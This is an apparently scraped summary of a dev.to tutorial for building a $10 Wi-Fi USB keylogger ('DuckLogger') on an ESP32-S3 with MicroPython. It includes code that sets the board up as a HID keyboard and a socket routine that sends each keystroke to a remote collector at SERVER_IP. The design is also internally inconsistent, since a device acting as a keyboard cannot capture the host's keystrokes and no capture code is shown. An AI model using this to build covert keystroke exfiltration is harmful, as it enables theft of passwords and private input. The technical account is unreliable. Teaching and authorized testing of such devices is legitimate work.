---
title: "Build a $10 DIY Wi-Fi USB Keylogger with ESP32-S3 and MicroPython (DuckLogger)"
url: "https://dev.to/monazir/build-a-10-diy-wi-fi-usb-keylogger-with-esp32-s3-and-micropython-ducklogger-30dl"
author: "Monazir Muhammad Doha"
category: "esp32-hardware"
---
# Build a $10 DIY Wi-Fi USB Keylogger with ESP32-S3 and MicroPython (DuckLogger)

**Author:** Monazir Muhammad Doha  **Published:** 2026-03-01

## Overview

Building a WiFi-enabled USB keylogger using MicroPython on ESP32-S3 for under $10. The DuckLogger project uses the ESP32-S3's native USB HID support to capture keystrokes and transmit them wirelessly — primarily for security education and authorized penetration testing.

## Key Concepts

- **MicroPython HID**: Using MicroPython's USB HID library on ESP32-S3 native USB
- **WiFi Exfiltration**: Real-time keystroke transmission over 802.11 to remote log collector
- **$10 Hardware**: ESP32-S3 SuperMini (native USB) + minimal components
- **Bad USB / Rubber Ducky Style**: Device appears as legitimate keyboard to host
- **Data Storage**: Can log to local flash or stream to WiFi server in real-time

## MicroPython Stack

```python
import usb.device
from usb.device.hid import KeyboardInterface

# ESP32-S3 acts as USB HID keyboard
kbd = KeyboardInterface()
usb.device.get().init(kbd, builtin_driver=True)
```

```python
# WiFi exfiltration of captured keystrokes
import network
import socket

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect(SSID, PASSWORD)

def send_keystroke(key):
    s = socket.socket()
    s.connect((SERVER_IP, 9999))
    s.send(key.encode())
    s.close()
```

## ESP32-S3 vs Other Platforms

| Platform | Cost | Native USB | MicroPython | WiFi |
|---------|------|-----------|-------------|------|
| ESP32-S3 | $3–5 | Yes | Yes | Yes |
| Raspberry Pi Zero W | $15 | Via OTG | Yes | Yes |
| Flipper Zero | $170 | Via BadUSB | No | No |

## Ethical/Legal Notice

Keylogger deployment without explicit authorization is illegal. This content is for:
- CTF competitions
- Authorized penetration testing
- Security research in controlled environments
- Security awareness demonstrations
